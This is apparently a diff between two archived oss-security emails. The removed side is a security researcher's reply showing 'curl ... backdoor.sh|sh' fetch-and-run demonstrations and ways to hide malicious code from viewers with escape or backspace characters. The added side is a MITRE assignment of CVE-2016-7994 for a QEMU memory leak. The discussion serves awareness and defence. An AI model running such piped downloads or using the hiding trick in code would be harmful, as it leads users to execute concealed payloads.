@@ -1,82 +1,50 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/21/9
-Message-ID: <20160421194559.GA3946@jwilk.net>
-Date: Thu, 21 Apr 2016 21:45:59 +0200
-From: Jakub Wilk <jwilk@...lk.net>
-To: oss-security@...ts.openwall.com
-Subject: Re: s/party/hack like it's 1999
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/08/3
+Message-Id: <20161008152944.DC87242E058@smtpvbsrv1.mitre.org>
+Date: Sat,  8 Oct 2016 11:29:44 -0400 (EDT)
+From: cve-assign@...re.org
+To: ppandit@...hat.com
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com, liqiang6-s@....cn
+Subject: Re: CVE request Qemu virtio-gpu: memory leak in virtio_gpu_resource_create_2d
 Content-Type: text/plain; charset=utf-8
 
-* up201407890@...nos.dcc.fc.up.pt, 2015-09-17, 18:03:
->$ curl 127.0.0.1/backdoor.sh
->#!/bin/bash
->echo doing something very nice!
->
->$ wget -qO - 127.0.0.1/backdoor.sh
->#!/bin/bash
->echo doing something very nice!
->
->
->But if we pipe it into a shell...
->
->
->$ curl -s 127.0.0.1/backdoor.sh|sh
->doing something evil!
->
->$ wget -qO - 127.0.0.1/backdoor.sh|sh
->doing something evil!
->
->
->You might be thinking "If I opened that in my browser, I would detect 
->it being malicious!"
->Well, think again...
->One can have all sorts of fun with user-agents, something that can 
->easily come to mind is verifying if the user-agent is from curl or 
->wget,
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-...or this:
-https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/
+> Quick Emulator(Qemu) built with the Virtio GPU Device support is vulnerable to
+> a memory leakage issue. It could occur while processing virtio GPU command
+> VIRTIO_GPU_CMD_RESOURCE_CREATE_2D.
+> 
+> A privileged user/process inside guest could use this flaw to exhaust host
+> memory resulting in DoS.
+> 
+> https://lists.gnu.org/archive/html/qemu-devel/2016-09/msg04129.html
 
->'less' doesn't interpret escape sequences unless the -r switch is used, 
->so stop aliasing it to 'less -r' just because there's no colored 
->output.
+Use CVE-2016-7994.
 
-As somebody else noted, it should be s/doesn't interpret/neutralizes/ or 
-something. But that doesn't mean you should feel safe if you don't use 
--r.
+This is not yet available at
+http://git.qemu.org/?p=qemu.git;a=history;f=hw/display/virtio-gpu.c but
+that may be an expected place for a later update.
 
-For example, when git automatically spawns a pager, it puts R in the 
-LESS environment variable. (That would be fine if git escaped \033 
-before passing them to the pager, but it doesn't. Oddly, it does seem to 
-escape other control characters.) Now, -R is less convenient than -r for 
-hiding malicious code, but you could still set foreground and background 
-to black in hope that the victim's terminal background is also black.
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-But even without -r or -R, one can use backspace characters to hide evil 
-payload:
-
-| $ less -FX hello.c
-| #include <stdio.h>
-| #include <stdlib.h>
-|
-| int main(int argc, char **argv)
-| {
-|         /* Copyright 2015-2016 Jakub Wilk */
-|         printf("Hello world!\n");
-|         return 0;
-| }
-|
-| $ gcc -Wall hello.c -o hello && ./hello
-|  ________
-| < ^H^H^H >
-|  --------
-|         \   ^__^
-|          \  (oo)\_______
-|             (__)\       )\/\
-|                 ||----w |
-|                 ||     ||
-
--- 
-Jakub Wilk
-
-View attachment "hello.c" of type "text/x-csrc" (229 bytes)
+iQIcBAEBCAAGBQJX+RAeAAoJEHb/MwWLVhi2gn8P/2WXoxRXiXfBxIc5Yt2YZjoZ
++zqKhswXFESnQY3JC+qlkFVvg2sSoakc4gxkGHEx/2TOCVay4jQpw8hOU7njwEcA
+kLgOLYeSjQ0OhsSQ/sC3PPTe81GFVbYx7oWr9DcL/gcwj+/Yu1FIuIzt/PbsAiUz
+3l9j+TbNt98rhFgzmtFHzBRBhBgxQQZSFyFjpPTk4C9OJoiwygEifKAsdxOrA/WS
+ZQciImoinC5tAFbAJws8CcXy2vO6evxeEynULX0KeoMneh5opMAZmnZmaTpccTb2
+niLYlsPJivoDW1RxcXC2Bag29258PKq5A3j7Oo9GVvbGpa5EqAIVQOQGSuwg/Y+G
+PAQ0KxWwdPDlY3Kl6kz0Pz7qGUzQrtNdGzy5IKdCB+INfh4zmDTiGwyNFprIH/dN
+nSGbun+Xqi36K53a0quCxRzbudYGpiLzspWZmFml+Gn8Nx5O/6nCJCfQg0vRGBhD
+FE80+vo06KR5RGqDUgyBvvqloRtc/S+RoWEuLeXJoRG53MgD6yFKY6hqYIvNePLX
+yduwq534m0nR077H7r16z/oQJlcRid+nRjtHLATvUj2FSJ60OeP4YyorMGg04MLn
+clotlx8GYkbBVBgNGuqxg6mKvb2Aks2wKRYU81R4gE9v/8BfIEErsQn4617iNu5T
+VgECwvU7fbVvd5W1mQ3a
+=9OnQ
+-----END PGP SIGNATURE-----
